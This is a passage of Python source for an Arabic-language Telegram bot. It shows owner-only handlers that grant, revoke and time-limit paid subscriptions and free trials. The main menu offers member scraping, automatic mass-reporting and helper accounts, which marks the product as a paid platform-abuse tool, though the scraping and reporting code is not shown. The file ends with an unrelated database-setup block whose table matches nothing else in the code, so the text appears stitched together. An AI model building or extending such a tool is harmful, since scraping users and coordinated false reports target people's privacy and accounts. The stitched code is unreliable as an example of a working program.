            await conv.send_message("❌ أيدي غير صالح.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            return

        await conv.send_message(
            "⏱ **ما هي مدة الصلاحية؟**\n\n"
            "▫️ أرسل **عدد الأيام** (مثال: `30` للاشتراك الشهري)\n"
            "▫️ أو أرسل كلمة **دائمي** للاشتراك مدى الحياة.\n\n*أرسل /cancel للإلغاء.*"
        )
        try: msg_duration = await conv.get_response(timeout=120)
        except asyncio.TimeoutError: return

        if msg_duration.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            return
            
        duration_input = msg_duration.text.strip()
        exp_timestamp = None
        
        if duration_input == "دائمي":
            exp_timestamp = None
            dur_msg = "اشتراك دائمي مفتوح"
        elif duration_input.isdigit():
            days = int(duration_input)
            exp_timestamp = time.time() + (days * 86400)
            dur_msg = f"{days} يوم"
        else:
            await conv.send_message("❌ إدخال غير صالح. يرجى إدخال عدد صحيح أو كلمة 'دائمي'.")
            return
            
        data = load_data()
        data["authorized_users"][new_id_str] = exp_timestamp
        save_data(data)
        
        await conv.send_message(f"✅ تم منح الصلاحية بنجاح!\n👤 المستخدم: `{new_id_str}`\n⏱ الصلاحية: `{dur_msg}`", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])

@bot.on(events.CallbackQuery(data=b"owner_del_user"))
async def owner_del_user_handler(event):
    if event.sender_id != OWNER_ID: return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🚫 **أرسل الأيدي (ID) للمستخدم لسحب الصلاحية منه:**\n\n*لإلغاء العملية أرسل /cancel*")
        try: msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError: return
            
        if msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            return
            
        del_id_str = msg.text.strip()
        if del_id_str == str(OWNER_ID):
            await conv.send_message("❌ لا يمكنك سحب الصلاحية من نفسك (المالك الأساسي).")
            return
            
        data = load_data()
        if del_id_str in data.get("authorized_users", {}):
            del data["authorized_users"][del_id_str]
            save_data(data)
            await conv.send_message(f"✅ تم سحب الصلاحية من المستخدم `{del_id_str}`.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
        else:
            await conv.send_message("⚠️ هذا المستخدم غير موجود في قائمة المصرح لهم.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])

@bot.on(events.CallbackQuery(data=b"owner_add_trial"))
async def owner_add_trial_handler(event):
    if event.sender_id != OWNER_ID: return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🎁 **أرسل أيدي (ID) أو يوزر الشخص لتفعيل التجربة المجانية له:**\n\n*لإلغاء العملية أرسل /cancel*")
        try: msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return
            
        target = msg.text.strip()
        if target.startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            return
            
        user_id = None
        status_msg = await conv.send_message("🔍 جاري التحقق من الحساب...")
        
        try:
            if target.isdigit(): user_id = int(target)
            else:
                if target.startswith("@"): target = target[1:]
                entity = await bot.get_entity(target)
                user_id = entity.id
                
            data = load_data()
            if "trial_users" not in data: data["trial_users"] = []
                
            if str(user_id) in data.get("authorized_users", {}):
                await status_msg.edit("⚠️ هذا المستخدم لديه صلاحية كاملة بالفعل ولا يحتاج لتجربة مجانية.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
                return
                
            if user_id not in data["trial_users"]:
                data["trial_users"].append(user_id)
                save_data(data)
                await status_msg.edit(f"✅ **تم منح تجربة مجانية بنجاح!**\n🆔 الأيدي: `{user_id}`\n📌 لن تُسحب صلاحيته إلا بعد أن يكمل أول عملية جمع أو إرسال ناجحة.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            else: await status_msg.edit("⚠️ هذا المستخدم لديه تجربة مجانية مسبقاً في الانتظار.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
        except Exception as e:
            await status_msg.edit(f"❌ لم يتم العثور على الحساب أو أن البوت لم يتفاعل معه مسبقاً. تأكد من أن المستخدم قام بإرسال /start للبوت.\nالخطأ: {e}")

@bot.on(events.CallbackQuery(data=b"back_start"))
async def back_start_handler(event):
    buttons = [
        [Button.inline("🔍 خمط الأعضاء (جمع وتصفية)", b"main_scrape_menu")],
        [Button.inline("🔥 الشد التلقائي (الريبورتات)", b"main_report_menu")],
        [Button.inline("➕ إضافة حساب مساعد", b"add_account"), Button.inline("📂 إدارة الحسابات", b"list_accounts")]
    ]
    if event.sender_id == OWNER_ID:
        buttons.append([Button.inline("👑 لوحة تحكم المالك", b"owner_panel")])

    await event.edit(
        "👋 **أهلاً بك في القائمة الرئيسية**\n\n▫️ اختر أحد الأوضاع من القائمة أدناه:",
        buttons=buttons
    )

import asyncio
import aiosqlite

# دالة لإنشاء الجداول إذا لم تكن موجودة
async def init_db():
    async with aiosqlite.connect("bot_database.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                balance INTEGER DEFAULT 0,
                is_referred BOOLEAN DEFAULT FALSE
            )
        """)
        await db.commit()
        print("Database initialized successfully!")

# تشغيل قاعدة البيانات أولاً، ثم تشغيل البوت
loop = asyncio.get_event_loop()
loop.run_until_complete(init_db())

print("Bot is running...")
bot.run_until_disconnected()

